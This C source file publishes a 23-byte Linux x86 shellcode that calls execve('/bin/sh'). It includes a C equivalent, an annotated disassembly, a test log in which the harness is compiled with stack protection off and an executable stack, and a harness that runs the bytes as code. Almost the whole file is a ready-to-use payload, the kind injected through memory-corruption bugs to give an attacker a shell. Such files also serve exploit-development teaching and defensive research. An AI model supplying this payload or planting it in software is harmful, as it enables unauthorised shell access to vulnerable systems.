/*
@Linux/x86 execve("/bin/sh");23 bytes shellcode
@Date: 2015-12-18
@Author: byhankswang@gmail.com
@Github: https://github.com/byhankswang
@Tested on: x86-32/i686 ubuntu-14.04 Kernel-3.19.0-25-generic 

@what we want to do:
#include <stdio.h>

    void main(void)
    {

        char *sc[2];
        sc[0] = "/bin/sh";
        sc[1] = NULL;

        execve( sc[0], 0, 0);
    }

@assembly to realize the above code

    08048054 <_start>:
     8048054:       31 c0                   xor    %eax,%eax
     8048056:       50                      push   %eax
     8048057:       68 6e 2f 73 68          push   $0x68732f6e
     804805c:       68 2f 2f 62 69          push   $0x69622f2f
     8048061:       89 e3                   mov    %esp,%ebx
     8048063:       50                      push   %eax
     8048064:       53                      push   %ebx
     8048065:       89 e1                   mov    %esp,%ecx
     8048067:       b0 0b                   mov    $0xb,%al
     8048069:       cd 80                   int    $0x80

@testing results
    byhankswang@vubuntu32:~$ uname -a
    Linux vubuntu32 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
    byhankswang@vubuntu32:~$
    byhankswang@vubuntu32:~$ cat /etc/os-release
    NAME="Ubuntu"
    VERSION="14.04.3 LTS, Trusty Tahr"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 14.04.3 LTS"
    VERSION_ID="14.04"
    HOME_URL="http://www.ubuntu.com/"
    SUPPORT_URL="http://help.ubuntu.com/"
    BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
    byhankswang@vubuntu32:~$
    byhankswang@vubuntu32:~$ gcc -fno-stack-protector -z execstack -o bin_sh bin_sh.c
    byhankswang@vubuntu32:~$
    byhankswang@vubuntu32:~$ ./bin_sh
    $
    $ env
    PWD=/home/byhankswang
    $ exit
    byhankswang@vubuntu32:~$

*/



#include <stdio.h>

int main(void)
{

    char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
    (*(void(*)())shellcode)();
}
